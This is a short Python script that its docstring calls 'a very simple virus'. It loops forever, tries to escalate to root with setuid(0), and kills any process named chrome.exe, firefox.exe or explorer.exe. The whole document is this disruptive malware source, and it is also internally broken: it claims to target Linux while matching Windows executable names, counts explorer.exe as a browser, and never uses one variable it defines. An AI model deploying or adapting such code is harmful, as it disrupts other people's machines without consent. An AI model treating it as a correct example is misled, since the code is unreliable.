#!/usr/bin/env python3

""" A very simple virus that scans a Linux system for any running browsers and terminates them """

from psutil import process_iter
from os import kill, getuid, setuid
from signal import SIGTERM
from time import sleep

if __name__ == "__main__":
  target_browser_executables = ('chrome.exe', 'firefox.exe', 'explorer.exe')
  testing_target = ('notepad.exe')

  while True:
    running_processes = {p.pid: p.info['name'] for p in process_iter(["pid", "name"])}
    for pid, p_name in running_processes.items():
      if p_name in target_browser_executables:
        if getuid() != 0: setuid(0);
        kill(pid, SIGTERM)
        sleep(10)
